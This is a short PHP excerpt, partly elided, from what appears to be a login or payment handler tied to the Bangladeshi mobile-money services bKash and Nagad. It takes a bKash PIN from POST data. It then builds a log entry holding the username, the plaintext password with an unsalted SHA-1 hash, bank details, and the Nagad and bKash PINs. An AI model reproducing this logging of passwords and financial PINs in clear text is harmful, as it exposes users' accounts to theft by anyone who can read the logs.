...
$pinBkash = !empty($_POST['pinBkash']) ? $_POST['pinBkash'] : $param_POST->pinBkash;
...
try {
    ...
    $logDes .= "Username: " . $username . ", Password: " . $password . " (" . sha1($password) . "), Bank: " . $bank . ", User Bank: " . $userBank . ", Pin Nagad: " . $pin . ", Pin Bkash: " . $pinBkash . "; ";
